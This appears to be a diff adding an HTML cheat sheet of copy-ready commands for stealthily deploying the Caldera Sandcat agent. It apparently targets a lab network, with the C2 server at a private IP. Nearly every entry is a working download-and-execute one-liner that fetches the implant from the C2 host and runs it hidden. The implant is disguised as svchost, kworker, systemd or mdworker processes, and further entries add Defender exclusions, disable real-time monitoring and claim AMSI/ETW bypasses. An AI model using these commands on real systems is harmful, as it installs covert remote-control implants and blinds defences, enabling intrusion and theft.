@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sandcat Deployment Commands - Caldera</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        h1 { color: #00ff00; border-bottom: 2px solid #00ff00; padding-bottom: 10px; }
+        h2 { color: #00aaff; margin-top: 30px; }
+        .command-box {
+            background: #2d2d2d;
+            border: 1px solid #444;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+            position: relative;
+        }
+        .command {
+            color: #ffffff;
+            word-wrap: break-word;
+            font-size: 14px;
+        }
+        .label {
+            color: #ffaa00;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .info {
+            color: #aaaaaa;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #00aaff;
+            color: #fff;
+            border: none;
+            padding: 5px 15px;
+            cursor: pointer;
+            border-radius: 3px;
+        }
+        .copy-btn:hover { background: #0088cc; }
+        .status { color: #00ff00; margin-bottom: 20px; }
+        .warning { color: #ffaa00; }
+        .section { margin: 30px 0; padding: 20px; background: #252525; border-left: 4px solid #00ff00; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Sandcat Stealth Deployment Commands</h1>
+        <div class="status">
+            [+] Server: http://192.168.124.133:8888<br>
+            [+] Payloads: Obfuscated with GoHide (mitre/caldera/gocat strings removed)<br>
+            [+] Deployment: AMSI/ETW bypass included
+        </div>
+
+        <div class="section">
+            <h2>Windows Deployment</h2>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard('cmd1')">Copy</button>
+                <div class="label">Method 1: Full Stealth Script (RECOMMENDED)</div>
+                <div class="command" id="cmd1">IEX (New-Object Net.WebClient).DownloadString('http://192.168.124.133:8888/file/download') -Headers @{"file"="deploy-sandcat-stealth.ps1"}</div>
+                <div class="info">Includes: AMSI bypass, ETW bypass, script logging disable</div>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard('cmd2')">Copy</button>
+                <div class="label">Method 2: Compact One-Liner with Bypass</div>
+                <div class="command" id="cmd2">IEX (New-Object Net.WebClient).DownloadString('http://192.168.124.133:8888/file/download') -Headers @{"file"="sandcat-deploy-windows.ps1"}</div>
+                <div class="info">Compressed version with AMSI/ETW bypass (single line)</div>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard('cmd3')">Copy</button>
+                <div class="label">Method 3: Direct Download (No bypass - may be detected)</div>
+                <div class="command" id="cmd3">$server="http://192.168.124.133:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);[io.file]::WriteAllBytes("C:\Users\Public\svchost.exe",$data);Start-Process -FilePath C:\Users\Public\svchost.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;</div>
+                <div class="info warning">WARNING: No AMSI bypass - use only if Defender is disabled</div>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard('cmd4')">Copy</button>
+                <div class="label">Method 4: Manual Download + Execute</div>
+                <div class="command" id="cmd4">Invoke-WebRequest -Uri "http://192.168.124.133:8888/file/download" -Headers @{"platform"="windows";"file"="sandcat.go"} -OutFile "C:\Users\Public\svchost.exe"; Start-Process "C:\Users\Public\svchost.exe" -ArgumentList "-server http://192.168.124.133:8888 -group red" -WindowStyle Hidden</div>
+                <div class="info">Two-step process for more control</div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Linux Deployment</h2>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard('cmd5')">Copy</button>
+                <div class="label">Standard Deployment (systemd-networkd masquerading)</div>
+                <div class="command" id="cmd5">server="http://192.168.124.133:8888"; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > /tmp/.systemd-networkd; chmod +x /tmp/.systemd-networkd; nohup /tmp/.systemd-networkd -server $server -group red &</div>
+                <div class="info">Process name: systemd-networkd (hidden in /tmp)</div>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard('cmd6')">Copy</button>
+                <div class="label">Alternative: kworker masquerading</div>
+                <div class="command" id="cmd6">server="http://192.168.124.133:8888"; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > /tmp/kworker; chmod +x /tmp/kworker; nohup /tmp/kworker -server $server -group red &</div>
+                <div class="info">Process name: kworker (kernel worker thread)</div>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard('cmd7')">Copy</button>
+                <div class="label">Persistent Deployment (requires root)</div>
+                <div class="command" id="cmd7">server="http://192.168.124.133:8888"; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > /usr/local/bin/systemd-resolved; chmod +x /usr/local/bin/systemd-resolved; nohup /usr/local/bin/systemd-resolved -server $server -group red &</div>
+                <div class="info">Process name: systemd-resolved (DNS resolver)</div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>macOS Deployment</h2>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard('cmd8')">Copy</button>
+                <div class="label">Intel Mac (x86_64)</div>
+                <div class="command" id="cmd8">server="http://192.168.124.133:8888"; curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download > /tmp/mdworker; chmod +x /tmp/mdworker; nohup /tmp/mdworker -server $server -group red &</div>
+                <div class="info">Process name: mdworker (Spotlight indexer)</div>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard('cmd9')">Copy</button>
+                <div class="label">Apple Silicon (ARM64 - M1/M2/M3)</div>
+                <div class="command" id="cmd9">server="http://192.168.124.133:8888"; curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" $server/file/download > /tmp/mdworker; chmod +x /tmp/mdworker; nohup /tmp/mdworker -server $server -group red &</div>
+                <div class="info">For newer Macs with ARM processors</div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Verification</h2>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard('cmd10')">Copy</button>
+                <div class="label">Check Agent Beacon (API)</div>
+                <div class="command" id="cmd10">curl -u red:admin http://192.168.124.133:8888/api/v2/agents</div>
+                <div class="info">View registered agents via REST API</div>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard('cmd11')">Copy</button>
+                <div class="label">Monitor Caldera Logs</div>
+                <div class="command" id="cmd11">sudo journalctl -u caldera -f</div>
+                <div class="info">Real-time log monitoring for agent beacons</div>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard('cmd12')">Copy</button>
+                <div class="label">Check Running Agent (Windows)</div>
+                <div class="command" id="cmd12">Get-Process svchost | Where-Object {$_.Path -like "*Public*"} | Format-List *</div>
+                <div class="info">Verify agent process is running</div>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard('cmd13')">Copy</button>
+                <div class="label">Check Running Agent (Linux)</div>
+                <div class="command" id="cmd13">ps aux | grep -E "systemd-networkd|kworker" | grep -v grep</div>
+                <div class="info">Verify agent process is running</div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Additional Defender Evasion (Windows)</h2>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard('cmd14')">Copy</button>
+                <div class="label">Add Path Exclusion</div>
+                <div class="command" id="cmd14">Add-MpPreference -ExclusionPath "C:\Users\Public"</div>
+                <div class="info">Requires Admin - prevents Defender from scanning directory</div>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard('cmd15')">Copy</button>
+                <div class="label">Add Process Exclusion</div>
+                <div class="command" id="cmd15">Add-MpPreference -ExclusionProcess "svchost.exe"</div>
+                <div class="info">Requires Admin - excludes process from scanning</div>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard('cmd16')">Copy</button>
+                <div class="label">Disable Real-Time Protection (Temporary)</div>
+                <div class="command" id="cmd16">Set-MpPreference -DisableRealtimeMonitoring $true</div>
+                <div class="info warning">WARNING: Leaves obvious traces in Event Log</div>
+            </div>
+        </div>
+
+        <div class="info" style="margin-top: 40px; text-align: center;">
+            [*] Access Caldera Web UI: <a href="http://192.168.124.133:8888" style="color: #00aaff;">http://192.168.124.133:8888</a><br>
+            [*] Credentials: red / admin<br>
+            [*] For detailed guide, see: ANTI_DEFENDER_GUIDE.md
+        </div>
+    </div>
+
+    <script>
+        function copyToClipboard(elementId) {
+            const text = document.getElementById(elementId).innerText;
+            navigator.clipboard.writeText(text).then(function() {
+                alert('Copied to clipboard!');
+            }, function(err) {
+                console.error('Could not copy text: ', err);
+            });
+        }
+    </script>
+</body>
+</html>
